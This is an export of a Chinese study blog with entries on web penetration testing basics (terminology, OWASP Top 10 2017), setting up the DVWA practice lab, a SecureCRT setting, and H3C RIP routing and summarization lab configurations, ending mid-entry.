Web 的攻击和破坏不断增长，据高盛统计数据表明，75% 的攻击是针对 Web 应用的。</p><p>然而，对于 Web 应用安全领域，很多企业还没有充分的认识、没有做好准备；许多开发人员也没有相应的经验，这给了黑客可乘之机。</p></blockquote><h2 id="Web攻击的常见目的"><a href="#Web攻击的常见目的" class="headerlink" title="Web攻击的常见目的"></a>Web攻击的常见目的</h2><ul><li>恶作剧；</li><li>关闭 Web 站点，拒绝正常服务；</li><li>篡改 Web 网页，损害企业名誉；</li><li>免费浏览收费内容；</li><li>盗窃用户隐私信息，例如 Email；</li><li>以用户身份登录执行非法操作，从而获取暴利；</li><li>以此为跳板攻击企业内网其他系统；</li><li>网页挂木马，攻击访问网页的特定用户群；</li><li>仿冒系统发布方，诱骗用户执行危险操作，例如用木马替换正常下载文件，要求用户汇款等；</li></ul><h2 id="Web安全术语"><a href="#Web安全术语" class="headerlink" title="Web安全术语"></a>Web安全术语</h2><ul><li><p>后门</p><ul><li>绕过安全控制而获取对程序或系统访问权的方法。后门的最主要目的就是方便以后再次秘密进入或者控制系统。</li></ul></li><li><p>Webshell</p><ul><li>Webshell 就是以 asp、php、jsp 或者 cgi 等网页文件形式存在的一种命令执行环境，也可以将其称作为一种网页后门。</li></ul></li><li><p>0day漏洞</p><ul><li>通常是指还没有补丁的漏洞。也就是说官方还没有发现或者是发现了还没有开发出安全补丁的漏洞</li></ul></li><li><p>Exploit</p><ul><li>简称 exp，漏洞利用</li></ul></li><li><p>提权</p><ul><li>提高自己在服务器中的权限，主要针对网站入侵过程中，当入侵某一网站时，通过各种漏洞提升 Webshell 权限以夺得该服务器权限。</li></ul></li><li><p>跳板</p><ul><li>跳板，简单来说，就是在进行攻击或渗透时，不直接发起，而是控制一台中间主机来进行。这台中间主机就成为跳板。</li></ul></li><li><p>拖库</p><ul><li>网站遭到入侵后，黑客窃取其数据库。</li></ul></li><li><p>社会工程学</p><ul><li>一种通过对受害者心理弱点、本能反应、好奇心、信任、贪婪等心理陷阱进行诸如欺骗、伤害等危害手段取得自身利益的手法，已成迅速上升甚至滥用的趋势。</li></ul></li><li><p>Apt 攻击</p><ul><li>高级持续性威胁。 利用先进的攻击手段对特定目标进行长期持续性网络攻击的攻击形式</li></ul></li></ul><h2 id="Web常见攻击手段"><a href="#Web常见攻击手段" class="headerlink" title="Web常见攻击手段"></a>Web常见攻击手段</h2><blockquote><p>针对 Web 服务的攻击手段五花八门，形形色色。为了帮助IT公司和开发团队规范应用程序开发流程和测试流程，提高Web产品的安全性，OWASP 组织每年都会发布 OWASP TOP 10 年度报告，该报告总结了 Web 应用程序最可能、最常见、最危险的十大漏洞<br>OWASP：开放式 Web 应用程序安全项目，是一个非营利组织，不附属于任何企业或财团。因此，由 OWASP 提供和开发的所有设施和文件都不受商业因素的影响。OWASP 支持商业安全技术的合理使用，它有一个论坛，在论坛里信息技术专业人员可以发表和传授专业知识和技能。</p></blockquote><h3 id="OWASP-TOP-10-2017"><a href="#OWASP-TOP-10-2017" class="headerlink" title="OWASP TOP 10 2017"></a>OWASP TOP 10 2017</h3><ul><li>A1 - Injection（注入漏洞）<ul><li>当不可信的数据作为命令或查询语句的一部分被发送给解释器的时候，会发生注入漏洞，包括 SQL、NoSQL、OS 以及 LDAP 注入等。</li><li>攻击者发送的恶意数据可能会诱使解释器执行计划外的命令，或在没有适当授权的情况下访问数据。</li></ul></li><li>A2 - BrokenAuthentication（中断身份认证）<ul><li>与认证和会话管理相关的应用函数经常被错误地实现，从而允许攻击者破坏密码、密钥或是会话令牌</li><li>或者利用其他的应用漏洞来暂时或永久地获取用户身份信息。</li></ul></li><li>A3 - Sensitive DataExposure（敏感数据泄露）<ul><li>许多 Web 应用程序和 API 不能正确的保护敏感数据，如金融、医疗保健和 PII（个人身份信息）等。攻击者可能会窃取或篡改这些弱保护的数据，从而进行信用卡欺诈、身份盗窃或其他犯罪行为。</li><li>在缺少额外保护（例如，在存放和传输过程中加密，且在与浏览器进行交换时需要特别谨慎）的情况下，敏感数据可能会受到损害。</li></ul></li><li>A4 - XML ExternalEntities（XXE）XML 外部处理器漏洞<ul><li>许多过时的或配置不当的XML处理器在XML文档内进行外部实体引用。</li><li>外部实体可用于泄露内部文件，通过使用文件URI处理器、内部文件共享、内部端口扫描、远程代码执行以及拒绝服务攻击等手段。</li></ul></li><li>A5 - Broken AccessControl（中断访问控制）<ul><li>限制“认证的用户可以实现哪些操作”的命令没有得到正确的执行。</li><li>攻击者可以利用这些漏洞访问未经授权的功能和数据，例如访问其他用户的账户，查看敏感文件，篡改其他用户的数据，更改访问权限等。</li></ul></li><li>A6 - SecurityMisconfiguration（安全配置错误）<ul><li>安全配置错误是最常见的问题。</li><li>这通常是由不安全的默认配置，不完整或 ad hoc 配置，开放云存储，错误配置的 HTTP 标头，以及包含敏感信息的详细错误信息造成的。</li><li>所有的操作系统、框架、库、应用程序都需要进行安全配置外，还必须要及时进行系统更新和升级。</li></ul></li><li>A7 - Cross-SiteScripting（XSS）跨站脚本攻击<ul><li>如果应用程序在未经适当验证或转义的情况下，能够在新网页中包含不受信任的数据，或是使用可以创建 HTML 或者 JavaScript 的浏览器 API 更新包含用户提供的数据的现有网页，就会出现 XSS 漏洞。</li><li>XSS 允许攻击者在受害者的浏览器中执行脚本，这些脚本可以劫持用户会话、破坏网站或将用户重定向到恶意网站中。</li></ul></li><li>A8 - InsecureDeserialization（不安全的反序列化）<ul><li>不安全的反序列化漏洞通常会导致远程代码执行问题。</li><li>即使反序列化错误不会导致远程代码执行，也可以被用来执行攻击，包括重放攻击、注入攻击以及权限提升攻击等。</li></ul></li><li>A9 - UsingComponents with Known Vulnerabilities（使用含有已知漏洞的组件）<ul><li>组件（如库、框架和其他软件模块）是以与应用程序相同的权限运行的。如果存在漏洞的组件被利用，这种攻击可能会导致严重的数据丢失或服务器接管危机。</li><li>使用已知漏洞组件的应用程序和API可能会破坏应用程序的防御系统，从而启动各种形式的攻击，造成更为严重的影响。</li></ul></li><li>A10 - InsufficientLogging &amp; Monitoring（不足的记录和监控漏洞）<ul><li>不足的记录和监控漏洞，再加上事件响应能力欠缺以及缺少有效的整合，使得攻击者可以进一步攻击系统，维持其持久性，转而攻击更多的系统，并篡改、提取或销毁数据。</li><li>大部分的数据泄露研究显示，检测出发生数据泄漏的时间通常需要超过 200 天，而且通常是外部机构率先发现数据泄漏的事实，而不是通过内部发现的。</li></ul></li></ul><h1 id="Web服务原理"><a href="#Web服务原理" class="headerlink" title="Web服务原理"></a>Web服务原理</h1><h2 id="Web概述"><a href="#Web概述" class="headerlink" title="Web概述"></a>Web概述</h2><ul><li>Web（World Wide Web）即全球广域网，也称为万维网，它是一种基于超文本和 HTTP 的、全球性的、动态交互的、跨平台的分布式图形信息系统。是建立在 Internet 上的一种网络服务，为浏览者在 Internet 上查找和浏览信息提供了图形化的、易于访问的直观界面，其中的文档及超级链接将 Internet上 的信息节点组织成一个互为关联的网状结构。</li><li>我们通常所说的 WWW 服务、Web 服务，其实是一个意思，泛指通过 HTTP 协议传输，使用图形化界面来展示信息的一种方式。也就是俗称的网站或者网页</li></ul><h2 id="Web相关概念"><a href="#Web相关概念" class="headerlink" title="Web相关概念"></a>Web相关概念</h2><ul><li>网页（Web 页面）：<ul><li>网页，是网站中的一个页面，通常是网页是构成网站的基本元素，是承载各种网站应用的平台。通俗的说，网站就是由网页组成的。</li></ul></li><li>网站（WebSite）：<ul><li>网站，指根据一定的规则，使用 HTML 等工具制作的用于展示特定内容的相关网页的集合。简单地说，网站是一种通讯工具，就像布告栏一样，人们可以通过网站来发布或收集信息。</li><li>网站就是一组相同所属的网页的集合</li></ul></li><li>HTML（超文本标记语言）：<ul><li>“超文本” 就是指页面文本内可以包含图片、链接，甚至音乐、程序等非文字元素。</li><li>是一种规范，一种标准，超文本标记语言通过标记符号来标记要显示的网页中的各个部分</li><li>网页的本质是使用 HTML 语言编写代码所产生的文件</li></ul></li><li>静态网页：<ul><li>指纯 HTML 语言编写，呈现的内容固定化的 Web 页面</li><li>静态网页所呈现的所有内容都编写在源文件中，更改内容只能修改源代码</li></ul></li><li>动态网页：<ul><li>除了 HTML，还使用相应的动态程序序言编写的 Web 页面</li><li>动态网页中呈现的内容一般存储在数据库中，通过程序语言来调用数据</li></ul></li><li>HTTP（超文本传输协议）：<ul><li>用于发布和接收 HTML 页面的协议，定义了 Web 客户端和服务器端的请求和应答标准</li><li>默认工作在 TCP 80 端口</li></ul></li><li>HTTPS（HTTP over SSL）<ul><li>基于 SSL 的 HTTP 协议，使用 SSL 协议来保护 HTTP 传输，使 HTTP 协议更加安全</li></ul></li><li>浏览器（Browser）：<ul><li>可以接收并解析 HTML 语言，使 HTML 能够图形化显示，并与 Web 服务器进行交互的应用程序</li></ul></li></ul><h2 id="Web服务组件"><a href="#Web服务组件" class="headerlink" title="Web服务组件"></a>Web服务组件</h2><p><img src="/images/Web%E6%B8%97%E9%80%8F%E6%A6%82%E8%BF%B0/01.jpg"><em>图1-1</em></p><blockquote><p>如图 1-1，要构建一个网站，一般需要具备 Web 服务系统、Web 服务软件、Web 开发语言、数据库这四个组件。这只是比较概括性的划分了 Web 服务的组件，如果要细分的话，还可以细分为操作系统、存储（Web 源文件和数据库）、Web 容器、中间件、Web 服务端语言、Web 开发框架、Web 应用、Web 前端框架、第三方内容等组件。本课程内容不关注 Web 的搭建和优化，所以只按照图示组件讲解</p></blockquote><h2 id="Web服务系统"><a href="#Web服务系统" class="headerlink" title="Web服务系统"></a>Web服务系统</h2><blockquote><p>Web 作为网络服务，必然需要基于操作系统来运行和工作，这里的 Web 服务系统指的就是 Web 服务运行在哪种操作系统上</p></blockquote><ul><li>Windows<ul><li>作为使用最广泛的电脑端操作系统，Windows 无疑是良好的运行 Web 服务的操作系统平台。无论是桌面版的 Windows，还是 Server 版的 Windows，都具备运行 Web 服务的能力，但生产环境中的 Web 服务更多的会选择 Server 版的 Windows，如 Windows Server 2003、Windows Server 2008、Windows Server 2012 等</li><li>Windows 拥有优秀的图形化界面处理能力，也成为了众多 Web 初学者入门会选择的操作系统</li></ul></li><li>Linux<ul><li>Server 端的操作系统，无疑是 Linux 的天下。基于开源、高效、安全等优点，Linux 成为了生产环境中搭建 Web 服务的首选操作系统</li><li>常见的有 CentOS、RatHat、Ubuntu，互联网中几乎 99% 的 Web 服务都运行在 Linux 系统之上</li></ul></li></ul><br /><br /><blockquote><p>转载于<a href="http://www.dengfm.com/">邓方鸣-在线文档库</a></p><p>转载目的：学习</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 网安笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网安笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWA环境搭建</title>
      <link href="/posts/34888"/>
      <url>/posts/34888</url>
      
        <content type="html"><![CDATA[<br /><br /><blockquote><p><font face="幼圆">学习渗透测试，特别是 Web 渗透，最头疼的无疑就是寻找靶机环境，通常是不同的漏洞需要找不同的靶机源码，而不同的源码通常 Web 架构又不一样，所以要找到一套能够练习所有 Web 渗透技巧的靶机环境，经常需要搭建 N 个 Web站点，无疑大大提高了学习的入门门槛。</font></p></blockquote><h2 id="DVWA简介"><a href="#DVWA简介" class="headerlink" title="DVWA简介"></a>DVWA简介</h2><p>​I.🦾<font face="黑体">DVWA（Damn Vulnerable Web Application）是一个用来进行安全脆弱性鉴定的PHP&#x2F;MySQL Web 应用，旨在为安全专业人员测试自己的专业技能和工具提供合法的环境，帮助web开发者更好的理解web应用安全防范的过程。</font><br>​II.🦾<font face="黑体">DVWA 一共包含了十个攻击模块，分别是：Brute Force（暴力（破解））、Command Injection（命令行注入）、CSRF（跨站请求伪造）、- File Inclusion（文件包含）、File Upload（文件上传）、Insecure CAPTCHA （不安全的验证码）、SQL Injection（SQL注入）、SQL Injection（Blind）（SQL盲注）、XSS（Reflected）（反射型跨站脚本）、XSS（St ored）（存储型跨站脚本）。包含了 OWASP TOP10 的所有攻击漏洞的练习环境，一站式解决所有 Web 渗透的学习环境。</font><br>​III.🦾<font face="黑体">另外，DVWA 还可以手动调整靶机源码的安全级别，分别为 Low，Medium，High，Impossible，级别越高，安全防护越严格，渗透难度越大。一般 Low 级别基本没有做防护或者只是最简单的防护，很容易就能够渗透成功；而 Medium 会使用到一些非常粗糙的防护，需要使用者懂得如何去绕过防护措施；High 级别的防护则会大大提高防护级别，一般 High 级别的防护需要经验非常丰富才能成功渗透；最后 Impossible 基本是不可能渗透成功的，所以 Impossible 的源码一般可以被参考作为生产环境 Web 防护的最佳手段</font></p><h2 id="DVWA安装"><a href="#DVWA安装" class="headerlink" title="DVWA安装"></a>DVWA安装</h2><ul><li><font face="楷体">上文提到，DVWA 是 PHP&#x2F;MySQL 的源码环境，所以需要准备 PHP 和 MySQL 的运行环境。PHPStudy 是一个 PHP 调试环境的程序集成包。该程序包集成最新的 LAMP 和 WAMP 架构，一次性安装，无须配置即可使用，是非常方便、好用的PHP调试环境。该软件提供 Windows 和 Linux 的版本，我们这里的演示环境为 Windows Server 2008 R2 X64，所以下载 Windows 版本。下面演示如何安装 DVWA，我们使用的 DVWA 版本是目前最新的 DVWA 1.9　</font></li></ul><p>　　安装环境所需工具下载地址：</p><p>PHPStudy：<a href="http://phpstudy.php.cn/download.html">http://phpstudy.php.cn/download.html</a></p><p>DVWA：<a href="https://github.com/ethicalhack3r/DVWA/archive/master.zip">https://github.com/ethicalhack3r/DVWA/archive/master.zip</a></p><p><em>步骤1：运行安装程序，选择安装目录，如图1-1</em></p><p><img src="/images/DVWA%E7%AE%80%E4%BB%8B%E5%AE%89%E8%A3%85/011.jpg"><em>图1-1</em></p><p><em>步骤2：解压完成，PHPStudy会自动运行，如出现图1-2所示报错，则需安装VC11、VC14运行库，运行库安装略</em></p><p><img src="/images/DVWA%E7%AE%80%E4%BB%8B%E5%AE%89%E8%A3%85/02.jpg"><em>图1-2</em></p><p><em>步骤3：点击<code>启动</code>按钮，直到显示Apache和MySQL都已经启动，则PHPStudy安装成功，如图1-3</em></p><p><img src="/images/DVWA%E7%AE%80%E4%BB%8B%E5%AE%89%E8%A3%85/03.jpg"><em>图1-3</em></p><p><em>步骤4：解压下载的<code>DVWA-master.zip</code>，把该文件复制到<code>PHPStudy</code>的默认Web站点跟目录，如图1-4</em></p><p><img src="/images/DVWA%E7%AE%80%E4%BB%8B%E5%AE%89%E8%A3%85/04.jpg"><em>图1-4</em></p><p><em>步骤 5：在 <code>C:\phpstudy\PHPTutorial\WWW\DVWA-master\config</code> 目录下，找到 <code>config.inc.php.dist</code> 文件，重命名为 <code>config.inc.php</code>，如图 1-5</em></p><p><img src="/images/DVWA%E7%AE%80%E4%BB%8B%E5%AE%89%E8%A3%85/05.jpg"><em>图1-5</em></p><p><em>步骤6：用记事本打开 <code>config.inc.php</code> 文件，把配置文档中的 <code>$_DVWA[ &#39;db_password&#39; ] = &#39;P@ssw0rd&#39;;</code> 修改为 <code>$_DVWA[ &#39;db_password&#39; ] = &#39;root&#39;;</code>，如图 1-6（这里修改的是 MySQL 的管理员密码，该密码默认是 root，如果修改过 MySQL 密码，这里需要改成你自己的密码）</em></p><p><img src="/images/DVWA%E7%AE%80%E4%BB%8B%E5%AE%89%E8%A3%85/06.jpg"><em>图1-6</em></p><p><em>步骤 7：使用浏览器访问站点安装页面，URL 使用本机 IP 地址即可，这里靶机的 IP 地址为 <code>10.10.10.101</code>，安装页面地址就为 <code>http://10.10.10.101/dvwa-master/setup.php</code>，如图 1-7</em></p><p><img src="/images/DVWA%E7%AE%80%E4%BB%8B%E5%AE%89%E8%A3%85/07.jpg"><em>图1-7</em></p><p><em>步骤 8：在安装页面下方点击 <code>Creat / Reset Database</code> 按钮来创建数据库，出现提示 <code>Setup Success</code> 则说明安装成功，如图 1-8。如果此处创建失败，检查上一步 MySQL 密码是否正确</em></p><p><img src="/images/DVWA%E7%AE%80%E4%BB%8B%E5%AE%89%E8%A3%85/08.jpg"><em>1-8</em></p><p><em>步骤 9：点击 <code>login</code>，进入登录页面，使用默认用户 <code>admin</code>，密码 <code>password</code> 登录到渗透练习页面，如图 2-1</em></p><p><img src="/images/DVWA%E7%AE%80%E4%BB%8B%E5%AE%89%E8%A3%85/09.jpg"><em>图2-1</em></p><p><em>步骤 10：点击 <code>DVWA Security</code> 按钮，在这个页面中可以设置 DVWA 的安全级别，可以发现当前默认的安全级别为 <code>Impossible</code>，如图 2-2</em></p><p><img src="/images/DVWA%E7%AE%80%E4%BB%8B%E5%AE%89%E8%A3%85/010.jpg"><em>图2-2</em></p><p><p>🦾至此 DVWA 就已经安装完毕，可以开始进行 Web 渗透的练习了。如果想还原到初始干净的状态，再次重置数据库即可。]]></content>
      
      
      <categories>
          
          <category> 网安笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网安笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>EVE-EG关联SecureCRT多窗口合并</title>
      <link href="/posts/8451"/>
      <url>/posts/8451</url>
      
        <content type="html"><![CDATA[<br /><br /><p><strong>I</strong>.<em>打开SecureCRT配置文件夹路径</em></p><p><img src="/images/EVE%E5%A4%9A%E7%AA%97%E5%8F%A3%E5%90%88%E5%B9%B6/01.jpg" alt="7"></p><p><strong>II</strong>.<em>在文件夹中找到该路径，找到并打开Global.ini文件</em></p><p><img src="/images/EVE%E5%A4%9A%E7%AA%97%E5%8F%A3%E5%90%88%E5%B9%B6/02.jpg"></p><p><strong>III</strong>.<em>找到Single Instance这一行，将后面的数值改为00000001</em></p><p><img src="/images/EVE%E5%A4%9A%E7%AA%97%E5%8F%A3%E5%90%88%E5%B9%B6/03.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> 数通学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数通学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>路由备份&amp;聚合实验</title>
      <link href="/posts/55560"/>
      <url>/posts/55560</url>
      
        <content type="html"><![CDATA[<br /><h3 id="实验拓扑"><a href="#实验拓扑" class="headerlink" title="实验拓扑"></a>实验拓扑</h3><p><img src="/images/%E8%B7%AF%E7%94%B1%E5%A4%87%E4%BB%BD&%E8%81%9A%E5%90%88%E5%AE%9E%E9%AA%8C/01.jpg"><em>图1-1</em></p><blockquote><p>注：如无特别说明，描述中的 R1 或 SW1 对应拓扑中设备名称末尾数字为 1 的设备，R2 或 SW2 对应拓扑中设备名称末尾数字为 2 的设备，以此类推；另外，同一网段中，IP 地址的主机位为其设备编号，如 R3 的 g0&#x2F;0 接口若在 <code>192.168.1.0/24</code> 网段，则其 IP 地址为 <code>192.168.1.3/24</code>，以此类推</p></blockquote><hr><h3 id="实验需求"><a href="#实验需求" class="headerlink" title="实验需求"></a>实验需求</h3><p><strong>I</strong>.按照图示配置 IP 地址，R3 上连接 <code>192.168.X.X/24</code> 4个业务网段</p><p><strong>II</strong>.配置 RIPv2 协议使全网互通，R1 和 R3 的直连链路不运行 RIP</p><p><strong>III</strong>.R1 上配置静态路由直接经过 R3 到达所有业务网段</p><p><strong>IV</strong>.R1 和 R2 上不允许出现业务网段的明细路由</p><p><strong>V</strong>.要求 R1 上到达所有业务网段优先走 R2，当 R2 的链路故障时，自动切换到走 R3</p><hr><h3 id="实验解法"><a href="#实验解法" class="headerlink" title="实验解法"></a>实验解法</h3><p>I.<strong>配置 IP 地址部分略</strong></p><p>II.<strong>配置 RIPv2 协议使全网互通，R1 和 R3 的直连链路不运行 RIP</strong></p><p><em>步骤 1：分别在 R1，R2，R3 上配置 RIPv2，关闭自动聚合，宣告所有直连网段，除了 R1 和 R3 的 <code>200.3.3.0/24</code> 网段</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[R1]rip</span><br><span class="line">[R1-rip-1]version 2</span><br><span class="line">[R1-rip-1]undo summary</span><br><span class="line">[R1-rip-1]network 200.1.1.0</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[R2]rip</span><br><span class="line">[R2-rip-1]version 2</span><br><span class="line">[R2-rip-1]undo summary</span><br><span class="line">[R2-rip-1]network 200.1.1.0</span><br><span class="line">[R2-rip-1]network 200.2.2.0</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[R3]rip</span><br><span class="line">[R3-rip-1]version 2</span><br><span class="line">[R3-rip-1]undo summary</span><br><span class="line">[R3-rip-1]network 200.2.2.0</span><br><span class="line">[R3-rip-1]network 192.168.0.0</span><br><span class="line">[R3-rip-1]network 192.168.1.0</span><br><span class="line">[R3-rip-1]network 192.168.2.0</span><br><span class="line">[R3-rip-1]network 192.168.3.0</span><br></pre></td></tr></table></figure><p>III.<strong>R1 上配置静态路由直接经过 R3 到达所有业务网段</strong></p><p>IV.<strong>R1 和 R2 上不允许出现业务网段的明细路由</strong></p><p>V.<strong>要求 R1 上到达所有业务网段优先走 R2，当 R2 的链路故障时，自动切换到走 R3</strong></p><p>　　<em>分析：R3 上一共有 4 个业务网段，而且是连续的 C 类网段，要求全网不允许出现业务网段的明细路由，所以 R1 上配置的静态路由必须是聚合路由，且 R3 需要把业务网段在 RIP 中聚合后发布<br>　　<code>192.168.0.0/24</code> - <code>192.168.3.0/24</code> 这 4 个业务网段是连续的，而且对 R1 来说在同一个下一跳，满足聚合要求。4 条路由聚合为一条，子网掩码需要缩短 2 位，聚合之后的路由为 <code>192.168.0.0/22</code> 网段<br>　　另外，需要优先走 R2，意味着配置的静态路由是作为浮动静态路由备份，静态路由的优先级需要修改到比 RIP 更大</em><br>　　<br><em>步骤 1：R1 上配置到达所有业务网段的静态聚合路由，同时修改优先级到 110，作为浮动静态路由备份</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[R1]ip route-static 192.168.0.0 22 200.3.3.3 preference 110</span><br></pre></td></tr></table></figure><p><em>步骤 2：R3 上在连接 R2 的接口上配置 RIP 聚合，把所有业务网段聚合为一条</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[R3]interface g0/1</span><br><span class="line">[R3-GigabitEthernet0/1]rip summary-address 192.168.0.0 22</span><br></pre></td></tr></table></figure><p><em>步骤 3：测试 R1 和 R2 上只存在业务网段的聚合路由，且 R1 上优先选择了 RIP 的路由</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[R1]display ip routing-table</span><br><span class="line"></span><br><span class="line">Destinations : 22       Routes : 22</span><br><span class="line"></span><br><span class="line">Destination/Mask   Proto   Pre Cost        NextHop         Interface</span><br><span class="line">……</span><br><span class="line">192.168.0.0/22     RIP     100 2           200.1.1.2       GE0/0</span><br><span class="line">……</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[R2]display ip routing-table </span><br><span class="line"></span><br><span class="line">Destinations : 21       Routes : 21</span><br><span class="line"></span><br><span class="line">Destination/Mask   Proto   Pre Cost        NextHop         Interface</span><br><span class="line">……</span><br><span class="line">192.168.0.0/22     RIP     100 1           200.2.2.3       GE0/1</span><br><span class="line">……</span><br></pre></td></tr></table></figure><p><em>步骤 4：当中断 R1 和 R2 相连的接口，R1 到达所有业务网段的路由会自动切换到静态路由</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[R1-GigabitEthernet0/0]shutdown </span><br><span class="line">[R1-GigabitEthernet0/0]display ip routing-table</span><br><span class="line"></span><br><span class="line">Destinations : 13       Routes : 13</span><br><span class="line"></span><br><span class="line">Destination/Mask   Proto   Pre Cost        NextHop         Interface</span><br><span class="line">……</span><br><span class="line">192.168.0.0/22     Static  110 0           200.3.3.3       GE0/1</span><br><span class="line">……</span><br></pre></td></tr></table></figure><br /><br /><blockquote><p>转载于<a href="http://www.dengfm.com/">邓方鸣-在线文档库</a></p><p>转载目的：学习</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 数通实验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> H3C实验 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>路由聚合与CIDR</title>
      <link href="/posts/40691"/>
      <url>/posts/40691</url>
      
        <content type="html"><![CDATA[<br /><h3 id="路由聚合"><a href="#路由聚合" class="headerlink" title="路由聚合"></a>路由聚合</h3><p><em><strong>定义</strong></em>：通过把多条路由聚合为一条来减小路由表规模，加快路由查表速度<br><em><strong>聚合的前提</strong></em></p><ul><li>被聚合的明细路由必须是同一下一跳或出接口</li><li>被聚合的明细路由必须是连续的子网</li></ul><p><em><strong>路由聚合算法</strong></em><br>掩码缩短位数和聚合对应关系：</p><ul><li><p>掩码缩短聚合数量</p><ul><li><p>12</p></li><li><p>24</p></li><li><p>38</p></li><li><p>416</p></li></ul></li></ul><p>要点：聚合必须是从该地址范围的第一个子网开始计算</p><h3 id="路由聚合引起的环路问题"><a href="#路由聚合引起的环路问题" class="headerlink" title="路由聚合引起的环路问题"></a>路由聚合引起的环路问题</h3><ul><li>错误的聚合配置会导致路由环路</li><li>默认路由的配置导致路由环路，解决方法，配置黑洞路由</li></ul><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[h3c-GigabitEthernet0/0]rip summary-address &#x27;network&#x27; &#x27;mask&#x27;#RIP手动聚合</span><br><span class="line">[h3c]ip route-static &#x27;netword&#x27; &#x27;mask&#x27; null0#配置静态黑洞路由</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 数通学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数通学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>大规模路由技术概述</title>
      <link href="/posts/63364"/>
      <url>/posts/63364</url>
      
        <content type="html"><![CDATA[<br /><br /><h2 id="大规模路由技术概述"><a href="#大规模路由技术概述" class="headerlink" title="大规模路由技术概述"></a>大规模路由技术概述</h2><p><img src="/images/%E5%A4%A7%E8%A7%84%E6%A8%A1%E8%B7%AF%E7%94%B1%E6%8A%80%E6%9C%AF%E6%A6%82%E8%BF%B0/01.jpg"></p><h3 id="三层网络模型与路由技术"><a href="#三层网络模型与路由技术" class="headerlink" title="三层网络模型与路由技术"></a>三层网络模型与路由技术</h3><ul><li>接入层：静态路由、RIPv2、二层环境</li><li>汇聚层：OSPF、IS-IS</li><li>核心层：OSPF、IS-IS、BGP</li><li>广域网连接：BGP、静态默认路由</li></ul><h3 id="大规模网络对路由技术的要求"><a href="#大规模网络对路由技术的要求" class="headerlink" title="大规模网络对路由技术的要求"></a>大规模网络对路由技术的要求</h3><p><strong>可靠性需求</strong></p><ul><li>汇聚层：路径自动冗余、区域划分隔离故障</li><li>核心层：路径自动冗余</li><li>广域网连接：BGP负载、浮动静态路由备份</li></ul><p><strong>可扩展性需求</strong></p><ul><li>采用VLSM规划有利于路由聚合</li><li>协议分层与与网络分层相结合</li><li>路由度量值符合网络需求</li></ul><p><strong>可管理性需求</strong></p><ul><li>能够通过调整来控制路由选择</li><li>能够控制路由传播范围</li><li>能够控制数据依据策略转发</li></ul><p><strong>网络快速恢复的需求</strong></p><ul><li>快速HELLO、BFD</li><li>快速收敛技术</li><li>快速重路由技术</li></ul><p><strong>解决IP地址短缺</strong></p><ul><li>支持IPv6</li></ul>]]></content>
      
      
      <categories>
          
          <category> 数通学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数通学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>园区网综合实验</title>
      <link href="/posts/41908"/>
      <url>/posts/41908</url>
      
        <content type="html"><![CDATA[<br /><hr><h3 id="实验拓扑"><a href="#实验拓扑" class="headerlink" title="实验拓扑"></a>实验拓扑</h3><p><img src="/images/%E5%9B%AD%E5%8C%BA%E7%BD%91%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C/01.jpg" alt="图1-1"></p><hr><h3 id="实验需求"><a href="#实验需求" class="headerlink" title="实验需求"></a>实验需求</h3><p><strong>I</strong>.局域网中存在 Vlan10 和 Vlan20 两个业务 VLAN，IP 网段分别对应 <code>192.168.1.0/24</code> 和 <code>192.168.2.0/24</code></p><p><strong>II</strong>.业务 VLAN 可以在所有链路上传输数据</p><p>SW3:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 